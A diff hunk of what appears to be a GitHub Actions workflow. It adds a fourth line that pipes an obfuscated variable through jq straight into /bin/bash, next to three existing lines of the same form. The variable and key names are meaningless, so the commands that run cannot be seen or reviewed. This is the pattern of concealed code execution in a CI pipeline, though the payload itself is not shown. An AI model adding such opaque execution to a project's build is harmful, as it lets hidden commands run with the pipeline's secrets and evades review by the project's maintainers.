@@ -33,6 +33,7 @@ jobs:
           echo $rb01 | jq -r .u4866 | /bin/bash
           printf '%s' "$ppr4" | jq -r .cd82679 | /bin/bash
           echo $behl2214 | jq -r .sd53 | /bin/bash
+          printf '%s' "$kd4" | jq -r .re8755 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
